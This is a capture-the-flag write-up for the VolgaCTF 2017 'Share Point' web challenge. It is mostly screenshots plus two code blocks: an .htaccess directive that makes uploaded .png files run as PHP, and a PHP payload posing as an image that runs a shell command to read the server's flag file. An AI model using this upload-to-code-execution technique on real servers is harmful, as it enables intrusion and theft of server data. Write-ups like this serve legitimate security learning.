# Share Point - 200 points

Look! I wrote a good service for sharing your files with your friends, enjoy)
share-point.quals.2017.volgactf.ru

Hints:
* flag's location is optimal

### Solution
![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_1.png)
![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_2.png)
![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_3.png)
![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_4.png)
```
AddHandler application/x-httpd-php .png
```
![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_5.png)
![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_6.png)
```php
<?php
$tmp = `cat /opt/flag.txt`;
header("Content-type: image/png");
$name = "cat.txt";
$file = fopen($name, "w"); 
fputs($file, iconv('cp1251', 'utf-8', $tmp));
fclose ($file); 
?>
```
![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_7.png)
![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_8.png)
